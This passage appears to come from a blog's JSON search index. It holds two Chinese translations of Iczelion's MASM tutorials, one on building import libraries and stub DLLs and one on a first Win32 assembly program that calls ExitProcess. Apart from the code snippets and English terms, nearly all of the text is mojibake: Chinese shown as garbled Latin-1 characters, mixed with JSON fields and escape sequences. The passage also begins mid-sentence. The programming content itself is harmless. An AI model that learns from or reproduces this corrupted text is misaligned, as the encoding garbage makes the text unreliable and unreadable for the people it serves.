æ„ä¹‰çš„å†’é™©ã€‚ä¸‹é¢æ˜¯æˆ‘æ‰€èƒ½æƒ³å‡ºçš„æ–¹æ³•ï¼Œä¸è¿‡æ²¡æœ‰ä¸€ä¸ªèƒ½100%å·¥ä½œã€‚\nä½¿ç”¨äº¤äº’å¼åç¼–è¯‘å·¥å…·ï¼ˆInteractive Disassembler (IDA)ï¼‰åç¼–è¯‘DLLï¼Œé€šè¿‡è¿™ä¸ªå¥‡å¦™çš„å·¥å…·ï¼Œä½ å¯ä»¥è·å¾—å‡½æ•°å‚æ•°çš„å¤§æ¦‚å°ºå¯¸ï¼Œä½†è¿™äº›ä¿¡æ¯æ˜¯ä¸å®Œå…¨çš„ï¼ŒIDAæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œä¸è¿‡æœ‰æ—¶å¿…é¡»é æˆ‘ä»¬è‡ªå·±åˆ¤æ–­ä»€ä¹ˆæ˜¯ä»€ä¹ˆã€‚ä½ å°†ä¸å¾—ä¸ä»”ç»†åˆ†æåç¼–è¯‘åçš„ç»“æœã€‚\nè§‚å¯Ÿå †æ ˆæŒ‡é’ˆåœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰å’Œä¹‹åçš„å€¼ã€‚æ–¹æ³•å¦‚ä¸‹ï¼š\né€šè¿‡GetProcAddressè·å¾—å‡½æ•°çš„åœ°å€ã€‚ è°ƒç”¨æƒ³è¦æµ‹è¯•çš„æ¯ä¸€ä¸ªå‡½æ•°ï¼Œä½†è¯·æ³¨æ„ï¼Œè°ƒç”¨è¿™äº›å‡½æ•°æ—¶ï¼Œä¸è¦ç»™ä»–ä»¬ä¼ é€’ä»»ä½•çš„å‚æ•°ã€‚è°ƒç”¨å‰è¯·æ³¨æ„ESPçš„å€¼ã€‚ å½“å‡½æ•°è¿”å›åï¼Œæ¯”è¾ƒè°ƒç”¨å‡½æ•°å‰ã€åESPçš„å€¼ã€‚åŸºæœ¬åŸç†æ˜¯ï¼šstdcallå‚æ•°è°ƒç”¨åå®šè§„å®šï¼Œå‡½æ•°è‡ªå·±è´Ÿè´£æ¢å¤å †æ ˆï¼Œç°åœ¨çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä¸ä¼ é€’ä»»ä½•å‚æ•°äº†å§ï¼Œæˆ‘ä»¬æ²¡ä¼ é€’å‚æ•°ï¼Œè€Œå‡½æ•°å´è‡ªä½œèªæ˜â€œæ¢å¤â€äº†ESPæŒ‡é’ˆï¼Œæ‰€ä»¥ESPçš„å˜åŒ–å€¼å°±æ˜¯æˆ‘ä»¬è¦å¾—å‚æ•°å°ºå¯¸äº†ã€‚ ä¸è¿‡ï¼Œä¸Šé¢çš„æ–¹æ³•å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œä¸‹é¢çš„è¿™äº›æƒ…å†µå°†ä¼šå¯¼è‡´å¤±è´¥ï¼š\nå¦‚æœDLLä¸­çš„å‡½æ•°ä½¿ç”¨äº†ä¸åŒäºstdcallçš„åˆ«çš„å‚æ•°ä¼ é€’åå®šã€‚ å¦‚æœå‡½æ•°åœ¨æ¢å¤å †æ ˆæ—¶å¤±è´¥ï¼Œæˆ‘ä»¬å°†æ— æ³•å¾—åˆ°ESPçš„æ­£ç¡®å€¼ã€‚ å¦‚æœè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å»åšä¸€äº›å±é™©çš„äº‹æƒ…ï¼Œæ¯”å¦‚ç¡¬ç›˜æ ¼å¼åŒ–ï¼Œé‚£æˆ‘ä»¬å³ä½¿å¾—åˆ°äº†ESPï¼Œææ€•ä»£ä»·å¤§äº†ç‚¹ ç ”ç©¶ç°æœ‰çš„ä½¿ç”¨DLLçš„ç¨‹åºï¼Œä½ å¯ä»¥é€šè¿‡è°ƒè¯•/åç¼–è¯‘è¿™äº›ç¨‹åºå»è·å¾—å‡½æ•°å‚æ•°çš„ä¸ªæ•°å’Œå°ºå¯¸ã€‚ä¸è®ºå¦‚ä½•ï¼Œåªè¦æœ‰å‡½æ•°åœ¨DLLä¸­ï¼Œè€Œåˆæ²¡æœ‰ä»»ä½•ç¨‹åºè°ƒç”¨è¿‡å®ƒï¼Œä½ å¯ä»¥ç”¨ä¸Šé¢çš„ä¸¤ä¸ªæ–¹æ³•ã€‚\nå»ºç«‹æˆ‘ä»¬è‡ªå·±çš„DLL åœ¨ä½ è·å¾—äº†å‡½æ•°çš„åå­—å’Œå‚æ•°å°ºå¯¸åï¼Œä½ å¯ä»¥å»ºç«‹ä¸€ä¸ªDLLæ¡†æ¶å¹¶åœ¨æ¡†æ¶ä¸­æ·»åŠ å’Œå…¶ä»–DLLã€æ–‡ä»¶ä¸­çš„ç›¸åŒåç§°çš„å‡½æ•°ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœDLLåªå«æœ‰ä¸€ä¸ªå‡½æ•°ï¼šGetSomeLine.å®ƒæœ‰16BYTESçš„å‚æ•°ã€‚åœ¨ASMæ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥è¿™æ ·å†™ï¼š\n1 2 3 4 5 6 .386 .model flat,stdcall .code GetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD GetSomeline endp end ä½ å¯èƒ½è¦é—®ï¼Œâ€œè¿™æ˜¯ä»€ä¹ˆï¼Ÿâ€ã€‚ä¸€ä¸ªæ²¡æœ‰å¤„ç†éƒ¨åˆ†çš„ç¨‹åºï¼Ÿè¯·è®°ä½ï¼šä¸€ä¸ªå¯¼å…¥åº“å¹¶æ²¡æœ‰è®°å½•ä¸€ä¸ªå‡½æ•°æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå®ƒåªæ˜¯è®°å½•å‡½æ•°åå’Œå‚æ•°å°ºå¯¸è€Œå·²ï¼Œå®ƒçš„ä»»åŠ¡å°±æ˜¯æä¾›å‡½æ•°çš„åç§°å’Œå°ºå¯¸ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æ·»åŠ å‡½æ•°çš„å¤„ç†éƒ¨åˆ†ã€‚å½“æˆ‘ä»¬å»ºç«‹DLLæ—¶ï¼ŒMASMä¼šå¸®æˆ‘ä»¬å®Œæˆå®ƒçš„å¯¼å…¥åº“çš„å»ºç«‹ã€‚ MASMåœ¨å»ºç«‹å¯¼å…¥åº“æ—¶å¹¶ä¸å…³å¿ƒæ¯ä¸ªå…·ä½“å‚æ•°çš„å°ºå¯¸ï¼Œå®ƒæ€»æ˜¯è±¡ä¸‹é¢è¿™æ ·ï¼š 1 2 3 4 5 6 .386 .model flat,stdcall .code GetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE GetSomeline endp end ç„¶åMASMå°†åœ¨å¯¼å…¥åº“ä¸­å»ºç«‹_GetSomeLine@16(å®ƒä¼šæŠŠæ¯ä¸€ä¸ªå‚æ•°çœ‹ä½œDWORD)ï¼Œè€Œå¹¶ä¸ç®¡å®ƒçš„å‚æ•°æ˜¯4ä¸ªBYTEè¿˜æ˜¯DWORDæˆ–æ˜¯å…¶ä»–ä»€ä¹ˆ\nå»ºç«‹åŒ¹é…çš„æ¨¡å—å®šä¹‰æ–‡ä»¶ï¼ˆ.DEFï¼‰ è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å·¥ä½œï¼Œä½ éœ€è¦è¿™ä¸ªæ–‡ä»¶æ¥æŒ‡å¯¼MASMå»å»ºç«‹æ­£ç¡®çš„DLLå’Œä¸ä¹‹åŒ¹é…çš„å¯¼å…¥åº“ã€‚ä¸€ä¸ªæ¨¡å—å®šä¹‰æ–‡ä»¶æ¨¡æ¿å¦‚ä¸‹ï¼š\n1 2 3 LIBRARY \u0026lt;The name of the DLL\u0026gt; EXPORTS \u0026lt;The names of the functions\u0026gt; ä½ ä»…ä»…éœ€è¦å¡«å…¥DLLçš„åå­—ï¼Œç„¶ååœ¨EXPORTSä¸‹æ·»å…¥å‡½æ•°çš„åå­—ã€‚æ¯ä¸ªå‡½æ•°åä¸€è¡Œã€‚ä¿å­˜æ–‡ä»¶ï¼Œä½ å°†è·å¾—ä¸€ä¸ªæ¨¡å—å®šä¹‰æ–‡ä»¶ã€‚\næ±‡ç¼–DLLæºä»£ç  æœ€åä¸€æ­¥ä¹Ÿæ˜¯æœ€ç®€å•çš„ä¸€æ­¥ï¼Œä»…ä»…éœ€è¦ML.EXEå’ŒLINK.EXE\n1 2 ml /c /coff /Cp blah.asm link /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj å¥½äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä½ çš„é¡¹ç›®ç›®å½•ï¼Œä½ ä¼šå‘ç°ä½ æƒ³è¦çš„å¯¼å…¥åº“å’ŒDLLã€‚\nè½¬è‡ªhttp://blog.csdn.net/taowen2002/article/details/15837\n","permalink":"https://www.hacktech.cn/post/%E6%80%8E%E6%A0%B7%E5%BB%BA%E7%AB%8B%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84masm%E5%AF%BC%E5%85%A5%E5%BA%93.html","summary":"\u003cp\u003eby Iczelion ï¼ˆç¿»è¯‘ï¼šèŠ±å¿ƒèåœyqzq@163.net) 9.5.2000\u003c/p\u003e\n\u003cp\u003eè¿™ç¯‡çŸ­æ–‡æ˜¯è®²è¿°å…³äºå»ºç«‹MASMå¯¼å…¥åº“ï¼ˆimport librariesï¼‰æŠ€å·§ï¼Œæˆ‘å‡è®¾ä½ å·²ç»çŸ¥é“ä»€ä¹ˆæ˜¯å¯¼å…¥åº“ã€‚åœ¨ä¸‹é¢ï¼Œæˆ‘å°†é›†ä¸­è®²è¿°å»ºç«‹MASMå¯¼å…¥åº“çš„æ–¹æ³•ã€‚\u003c/p\u003e","title":"æ€æ ·å»ºç«‹ä½ è‡ªå·±çš„MASMå¯¼å…¥åº“"},{"content":"è¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°†ç”¨æ±‡ç¼–è¯­è¨€å†™ä¸€ä¸ª Windows ç¨‹åºï¼Œç¨‹åºè¿è¡Œæ—¶å°†å¼¹å‡ºä¸€ä¸ªæ¶ˆæ¯æ¡†å¹¶æ˜¾ç¤º\u0026quot;ä½ å¥½ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªWin32æ±‡ç¼–ç¨‹åº\u0026quot;ã€‚\nç†è®ºçŸ¥è¯† Windows ä¸ºç¼–å†™åº”ç”¨ç¨‹åºæä¾›äº†å¤§é‡çš„èµ„æºã€‚å…¶ä¸­æœ€é‡è¦çš„æ˜¯Windows API (Application Programming Interface)ã€‚ Windows APIæ˜¯ä¸€å¤§ç»„åŠŸèƒ½å¼ºå¤§çš„å‡½æ•°ï¼Œå®ƒä»¬æœ¬èº«é©»æ‰åœ¨ Windows ä¸­ä¾›äººä»¬éšæ—¶è°ƒç”¨ã€‚è¿™äº›å‡½æ•°çš„å¤§éƒ¨åˆ†è¢«åŒ…å«åœ¨å‡ ä¸ªåŠ¨æ€é“¾æ¥åº“(DLL)ä¸­ï¼Œè­¬å¦‚ï¼škernel32.dllã€ user32.dll å’Œ gdi32.dllã€‚ Kernel32.dllä¸­çš„å‡½æ•°ä¸»è¦å¤„ç†å†…å­˜ç®¡ç†å’Œè¿›ç¨‹è°ƒåº¦ï¼›user32.dllä¸­çš„å‡½æ•°ä¸»è¦æ§åˆ¶ç”¨æˆ·ç•Œé¢ï¼›gdi32.dllä¸­çš„å‡½æ•°åˆ™è´Ÿè´£å›¾å½¢æ–¹é¢çš„æ“ä½œã€‚é™¤äº†ä¸Šé¢ä¸»è¦çš„ä¸‰ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œæ‚¨è¿˜å¯ä»¥è°ƒç”¨åŒ…å«åœ¨å…¶ä»–åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ï¼Œå½“ç„¶æ‚¨å¿…é¡»è¦æœ‰å…³äºè¿™äº›å‡½æ•°çš„è¶³å¤Ÿçš„èµ„æ–™ã€‚\nåŠ¨æ€é“¾æ¥åº“ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™äº› API çš„ä»£ç æœ¬èº«å¹¶ä¸åŒ…å«åœ¨ Windows å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯å½“è¦ä½¿ç”¨æ—¶æ‰è¢«åŠ è½½ã€‚ä¸ºäº†è®©åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶èƒ½æ‰¾åˆ°è¿™äº›å‡½æ•°ï¼Œå°±å¿…é¡»äº‹å…ˆæŠŠæœ‰å…³çš„é‡å®šä½ä¿¡æ¯åµŒå…¥åˆ°åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚è¿™äº›ä¿¡æ¯å­˜åœ¨äºå¼•å…¥åº“ä¸­ï¼Œç”±é“¾æ¥å™¨æŠŠç›¸å…³ä¿¡æ¯ä»å¼•å…¥åº“ä¸­æ‰¾å‡ºæ’å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚æ‚¨å¿…é¡»æŒ‡å®šæ­£ç¡®çš„å¼•å…¥åº“ï¼Œå› ä¸ºåªæœ‰æ­£ç¡®çš„å¼•å…¥åº“æ‰ä¼šæœ‰æ­£ç¡®çš„é‡å®šä½ä¿¡æ¯ã€‚\nå½“åº”ç”¨ç¨‹åºè¢«åŠ è½½æ—¶ Windows ä¼šæ£€æŸ¥è¿™äº›ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åŒ…æ‹¬åŠ¨æ€é“¾æ¥åº“çš„åå­—å’Œå…¶ä¸­è¢«è°ƒç”¨çš„å‡½æ•°çš„åå­—ã€‚è‹¥æ£€æŸ¥åˆ°è¿™æ ·çš„ä¿¡æ¯ï¼ŒWindows å°±ä¼šåŠ è½½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå¹¶ä¸”é‡å®šä½è°ƒç”¨çš„å‡½æ•°è¯­å¥çš„å…¥å£åœ°å€ï¼Œä»¥ä¾¿åœ¨è°ƒç”¨å‡½æ•°æ—¶æ§åˆ¶æƒèƒ½è½¬ç§»åˆ°å‡½æ•°å†…éƒ¨ã€‚\nå¦‚æœä»å’Œå­—ç¬¦é›†çš„ç›¸å…³æ€§æ¥åˆ†ï¼ŒAPI å…±æœ‰ä¸¤ç±»ï¼šä¸€ç±»æ˜¯å¤„ç† ANSI å­—ç¬¦é›†çš„ï¼Œå¦ä¸€ç±»æ˜¯å¤„ç† UNICODE å­—ç¬¦é›†çš„ã€‚å‰ä¸€ç±»å‡½æ•°åå­—çš„å°¾éƒ¨å¸¦ä¸€ä¸ª\u0026quot;A\u0026quot;å­—ç¬¦ï¼Œå¤„ç†UNICODEçš„åˆ™å¸¦ä¸€ä¸ª\u0026quot;W\u0026quot;å­—ç¬¦(å®½å­—ç¬¦)ã€‚æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„ANSIå­—ç¬¦ä¸²æ˜¯ä»¥ 0 (NULL) ç»“å°¾çš„ä¸€ä¸²å­—ç¬¦æ•°ç»„ï¼Œæ¯ä¸€ä¸ªANSIå­—ç¬¦æ˜¯ä¸€ä¸ª BYTE å®½ã€‚å¯¹äºæ¬§æ´²è¯­è¨€ä½“ç³»ï¼ŒANSI å­—ç¬¦é›†å·²è¶³å¤Ÿäº†ï¼Œä½†å¯¹äºæœ‰æˆåƒä¸Šä¸‡ä¸ªå”¯ä¸€å­—ç¬¦çš„å‡ ç§è±¡å½¢è¯­è¨€ä½“ç³»æ¥è¯´å°±åªæœ‰ç”¨ UNICODE å­—ç¬¦é›†äº†ã€‚æ¯ä¸€ä¸ª UNICODE å­—ç¬¦å æœ‰ä¸¤ä¸ª BYTE å®½ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ä½¿ç”¨ 65336 ä¸ªä¸åŒå­—ç¬¦äº†ã€‚\nè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¼•è¿› UNICODE çš„åŸå› ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬éƒ½å¯ä»¥åŒ…å«ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­å®šä¹‰ä¸€ä¸ªå®ï¼Œç„¶ååœ¨å®é™…è°ƒç”¨å‡½æ•°æ—¶ï¼Œå‡½æ•°ååä¸éœ€è¦åŠ åç¼€\u0026quot;A\u0026quot;æˆ–\u0026quot;W\u0026quot;ã€‚ å¦‚åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°foo()ï¼›\n1 2 3 4 5 #ifdef UNICODE #define foo() fooW() #else #define foo() fooA() #endif ä¾‹å­ æˆ‘å…ˆæŠŠç¨‹åºæ¡†æ¶æ”¾åœ¨ä¸‹é¢ï¼Œç„¶åæˆ‘ä»¬å†å‘é‡Œé¢åŠ ä¸œè¥¿ã€‚\n1 2 3 4 5 6 .386 .model flatï¼Œ stdcall .data .code startï¼š end start åº”ç”¨ç¨‹åºçš„æ‰§è¡Œæ˜¯ä» END å®šä¹‰çš„æ ‡è¯†ç¬¦åçš„ç¬¬ä¸€æ¡è¯­å¥å¼€å§‹çš„ã€‚åœ¨ä¸Šé¢çš„æ¡†æ¶ç¨‹åºä¸­å°±æ˜¯ä» START å¼€å§‹ã€‚ç¨‹åºé€æ¡è¯­å¥æ‰§è¡Œä¸€ç›´åˆ°é‡åˆ° JMPï¼ŒJNEï¼ŒJEï¼ŒRET ç­‰è·³è½¬æŒ‡ä»¤ã€‚è¿™äº›è·³è½¬æŒ‡ä»¤å°†æŠŠæ‰§è¡Œæƒè½¬ç§»åˆ°å…¶ä»–è¯­å¥ä¸Šï¼Œè‹¥ç¨‹åºè¦é€€å‡º Windowsï¼Œåˆ™å¿…é¡»è°ƒç”¨å‡½æ•° ExitProcessã€‚\n1 ExitProcess proto uExitCodeï¼šDWORD ä¸Šé¢ä¸€è¡Œæ˜¯å‡½æ•°åŸå‹ã€‚å‡½æ•°åŸå‹ä¼šå‘Šè¯‰ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨è¯¥å‡½æ•°çš„å±æ€§ï¼Œè¿™æ ·åœ¨ç¼–è¯‘å’Œé“¾æ¥æ—¶ï¼Œç¼–è¯‘å™¨å’Œé“¾æ¥å™¨å°±ä¼šä½œç›¸å…³çš„ç±»å‹æ£€æŸ¥ã€‚ å‡½æ•°çš„åŸå‹å®šä¹‰å¦‚ä¸‹ï¼š\n1 FunctionName PROTO [ParameterName]ï¼šDataTypeï¼Œ[ParameterName]ï¼šDataTypeï¼Œ... ç®€è¨€ä¹‹ï¼Œå°±æ˜¯åœ¨å‡½æ•°åååŠ ä¼ªæŒ‡ä»¤PROTOï¼Œå†è·Ÿä¸€ä¸²ç”±é€—å·ç›¸éš”çš„æ•°æ®ç±»å‹é“¾è¡¨ã€‚åœ¨å‰é¢çš„ ExitProcess å®šä¹‰ä¸­ï¼Œè¯¥å‡½æ•°æœ‰ä¸€ä¸ª DWORD ç±»å‹çš„å‚æ•°ã€‚å½“æ‚¨ä½¿ç”¨é«˜å±‚è°ƒç”¨è¯­å¥ INVOKE æ—¶ï¼Œä½¿ç”¨å‡½æ•°åŸå‹å®šä¹‰ç‰¹åˆ«æœ‰ç”¨ï¼Œæ‚¨å¯ä»¥ç®€å•åœ°è®¤ä¸º INVOKE æ˜¯ä¸€ä¸ªæœ‰å‚æ•°ç±»å‹æ£€æŸ¥çš„è°ƒç”¨è¯­å¥ã€‚è­¬å¦‚ï¼Œå‡è®¾æ‚¨è¿™æ ·å†™ï¼š\n1 call ExitProcess è‹¥æ‚¨äº‹å…ˆæ²¡æŠŠä¸€ä¸ªDWORDç±»å‹å‚æ•°å‹å…¥å †æ ˆï¼Œç¼–è¯‘å™¨å’Œé“¾æ¥å™¨éƒ½ä¸ä¼šæŠ¥é”™ï¼Œä½†æ¯«æ— ç–‘é—®ï¼Œåœ¨æ‚¨çš„ç¨‹åºè¿è¡Œæ—¶å°†å¼•èµ·å´©æºƒã€‚ä½†æ˜¯ï¼Œå½“æ‚¨è¿™æ ·å†™ï¼š\n1 invoke ExitProcess è¿æ¥å™¨å°†æŠ¥é”™æé†’æ‚¨å¿˜è®°å‹å…¥ä¸€ä¸ª DWORD ç±»å‹å‚æ•°ã€‚æ‰€ä»¥æˆ‘å»ºè®®æ‚¨ç”¨ INVOKE æŒ‡ä»¤è€Œä¸æ˜¯CALLå»è°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚INVOKE çš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 INVOKE expression [ï¼Œarguments] expression æ—¢å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°åä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚å‚æ•°ç”±é€—å·éš”å¼€ã€‚å¤§å¤šæ•°APIå‡½æ•°çš„åŸå‹æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ å¦‚æœæ‚¨ç”¨çš„æ˜¯ MASM32ï¼Œè¿™äº›å¤´æ–‡ä»¶åœ¨æ–‡ä»¶å¤¹MASM32/include ä¸‹ï¼Œ è¿™äº›å¤´æ–‡ä»¶çš„æ‰©å±•åä¸º INCï¼Œå‡½æ•°åå’Œ DLL ä¸­çš„å‡½æ•°åç›¸åŒï¼Œè­¬å¦‚ï¼šKERNEL32.LIB å¼•å‡ºçš„å‡½æ•° ExitProcess çš„å‡½æ•°åŸå½¢å£°æ˜äºkernel.incä¸­ã€‚æ‚¨ä¹Ÿå¯ä»¥è‡ªå·±å£°æ˜å‡½æ•°åŸå‹ã€‚\nå¥½ï¼Œæˆ‘ä»¬ç°åœ¨å›åˆ°ExitProcess å‡½æ•°ï¼Œå‚æ•°uExitCode æ˜¯æ‚¨å¸Œæœ›å½“æ‚¨çš„åº”ç”¨ç¨‹åºç»“æŸæ—¶ä¼ é€’ Windows çš„ã€‚ æ‚¨å¯ä»¥è¿™æ ·å†™ï¼š\n1 invoke ExitProcessï¼Œ0 æŠŠè¿™ä¸€è¡Œæ”¾åˆ°startæ ‡è¯†ç¬¦ä¸‹ï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºå°±ä¼šç«‹å³é€€å‡º Windowsï¼Œå½“ç„¶æ¯«æ— ç–‘é—®ä¸ªåº”ç”¨ç¨‹åºæœ¬èº«æ˜¯ä¸€ä¸ªå®Œæ•´çš„ Windows ç¨‹åºã€‚\nIDEä¸ºVisual MASMï¼Œmasm32å®‰è£…åœ¨c:\\masm32\n1 2 3 4 5 6 7 8 9 10 11 12 13 386 .model flatï¼Œ stdcall option casemapï¼šnone include c:\\masm32\\include\\windows.inc include c:\\masm32\\include\\kernel32.inc includelib c:\\masm32\\lib\\kernel32.lib .data .code start: invoke ExitProcessï¼Œ0 end start option casemapï¼šnone ä¸€å¥çš„æ„æ€æ˜¯å‘Šè¯‰ MASM è¦åŒºåˆ†æ ‡å·çš„å¤§å°å†™ï¼Œè­¬å¦‚ï¼šstart å’Œ START æ˜¯ä¸åŒçš„ã€‚è¯·æ³¨æ„æ–°çš„ä¼ªæŒ‡ä»¤ includeï¼Œè·Ÿåœ¨å…¶åçš„æ–‡ä»¶åæ‰€æŒ‡å®šçš„æ–‡ä»¶åœ¨ç¼–è¯‘æ—¶å°†â€œæ’â€åœ¨è¯¥å¤„ã€‚åœ¨æˆ‘ä»¬ä¸Šé¢çš„ç¨‹åºæ®µä¸­ï¼Œå½“MASMå¤„ç†åˆ°è¯­å¥ include c:\\masm\\include\\windows.inc æ—¶ï¼Œå®ƒå°±ä¼šæ‰“å¼€æ–‡ä»¶å¤¹c:\\masm32\\include ä¸­çš„æ–‡ä»¶windows.incï¼Œè¿™å’Œæ‚¨æŠŠæ•´ä¸ªæ–‡ä»¶éƒ½ç²˜è´´åˆ°æ‚¨çš„æºç¨‹åºä¸­çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ windows.inc åŒ…å«äº† WIN32 ç¼–ç¨‹æ‰€éœ€è¦çš„å¸¸é‡å’Œç»“æ„ä½“çš„å®šä¹‰ã€‚ ä½†æ˜¯å®ƒä¸åŒ…å«å‡½æ•°åŸå‹çš„å®šä¹‰ã€‚\næ‚¨çš„åº”ç”¨ç¨‹åºé™¤äº†ä» windows.inc ä¸­å¾—åˆ°ç›¸å…³å˜é‡ç»“æ„ä½“çš„å®šä¹‰å¤–ï¼Œè¿˜éœ€è¦ä»å…¶ä»–çš„å¤´æ–‡ä»¶ä¸­å¾—åˆ°å‡½æ•°åŸå‹çš„å£°æ˜ï¼Œè¿™äº›å¤´æ–‡ä»¶éƒ½æ”¾åœ¨ c:\\masm32\\include æ–‡ä»¶å¤¹ä¸­ã€‚ åœ¨æˆ‘ä»¬ä¸Šé¢çš„ä¾‹å­ä¸­è°ƒç”¨äº† kernel.dll ä¸­çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦åŒ…å«æœ‰è¿™ä¸ªå‡½æ•°åŸå‹å£°æ˜çš„å¤´æ–‡ä»¶ kernel.incã€‚å¦‚æœç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€è¯¥æ–‡ä»¶æ‚¨ä¼šå‘ç°é‡Œé¢å…¨æ˜¯ä» kernel.dllä¸­å¼•å‡ºçš„å‡½æ•°çš„å£°æ˜ã€‚å¦‚æœæ‚¨ä¸åŒ…å«kernel.incï¼Œæ‚¨ä»ç„¶å¯ä»¥è°ƒç”¨ï¼ˆcallï¼‰ExitProcessï¼Œä½†ä¸èƒ½å¤Ÿè°ƒç”¨ï¼ˆinvokeï¼‰ExitProcessï¼ˆè¿™ä¼šæ— æ³•é€šè¿‡ç¼–è¯‘å™¨å’Œè¿æ¥å™¨çš„å‚æ•°åˆæ³•æ€§æ£€æŸ¥ï¼‰ã€‚æ‰€ä»¥è‹¥ç”¨ invoke å»è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œæ‚¨å°±å¿…é¡»äº‹å…ˆå£°æ˜åŒ…å«å¤´æ–‡ä»¶ï¼Œæ‚¨å®Œå…¨å¯ä»¥åœ¨è°ƒç”¨è¯¥å‡½æ•°å‰åœ¨æºä»£ç çš„é€‚å½“ä½ç½®è¿›è¡Œå£°åã€‚åŒ…å«å¤´æ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†èŠ‚çœæ—¶é—´ï¼ˆå½“ç„¶è¿˜æœ‰æ­£ç¡®æ€§ï¼‰\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœ‹ includelib ä¼ªæŒ‡ä»¤ï¼Œå’Œ include ä¸åŒï¼Œå®ƒä»…ä»…æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨æ‚¨çš„ç¨‹åºå¼•ç”¨äº†å“ªä¸ªåº“ã€‚å½“ç¼–è¯‘å™¨å¤„ç†åˆ°è¯¥æŒ‡ä»¤æ—¶ä¼šåœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­æ’å…¥é“¾æ¥å‘½ä»¤å‘Šè¯‰é“¾æ¥å™¨é“¾å…¥ä»€ä¹ˆåº“ã€‚å½“ç„¶æ‚¨è¿˜å¯ä»¥é€šè¿‡åœ¨é“¾æ¥å™¨çš„å‘½ä»¤è¡ŒæŒ‡å®šå¼•å…¥åº“åç§°çš„æ–¹æ³•æ¥è¾¾åˆ°å’Œç”¨includelibæŒ‡ä»¤ç›¸åŒçš„ç›®çš„ï¼Œä½†è€ƒè™‘åˆ°å‘½ä»¤è¡Œä»…èƒ½å¤Ÿä¼ é€’128ä¸ªå­—ç¬¦è€Œä¸”è¦ä¸åŒå…¶çƒ¦åœ°åœ¨å‘½ä»¤è¡Œæ•²å­—ç¬¦ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•æ˜¯éå¸¸ä¸å¯å–çš„ã€‚\nå‘½ä»¤è¡Œç¼–è¯‘ å¥½äº†ï¼Œç°åœ¨ä¿å­˜ä¾‹å­ï¼Œå–åä¸ºmsgbox.asmã€‚æŠŠ ml.exeï¼ˆC:\\masm32\\binï¼‰ çš„è·¯å¾„æ”¾åˆ° PATH ç¯å¢ƒå˜é‡ä¸­ï¼Œé”®å…¥ä¸‹é¢ä¸€è¡Œ è¿›è¡Œç¼–è¯‘ï¼š\n1 ml /c /coff /Cp msgbox.asm /c æ˜¯å‘Šè¯‰MASMåªç¼–è¯‘ä¸é“¾æ¥ã€‚è¿™ä¸»è¦æ˜¯è€ƒè™‘åˆ°åœ¨é“¾æ¥å‰æ‚¨å¯èƒ½è¿˜æœ‰å…¶ä»–å·¥ä½œè¦åšã€‚ /coff å‘Šè¯‰MASMäº§ç”Ÿçš„ç›®æ ‡æ–‡ä»¶ç”¨ coff æ ¼å¼ã€‚MASM çš„ coff æ ¼å¼æ˜¯COFFï¼ˆCommon Object File Formatï¼šé€šç”¨ç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼‰ æ ¼å¼çš„ä¸€ç§å˜ä½“ã€‚åœ¨ UNIX ä¸‹çš„ COFF æ ¼å¼åˆæœ‰ä¸åŒã€‚ /Cp å‘Šè¯‰ MASM ä¸è¦æ›´æ”¹ç”¨æˆ·å®šä¹‰çš„æ ‡è¯†ç¬¦çš„å¤§å°å†™ã€‚åœ¨.model æŒ‡ä»¤ä¸‹åŠ å…¥ \u0026ldquo;option casemapï¼šnone\u0026rdquo; è¯­å¥ï¼Œå¯è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚ 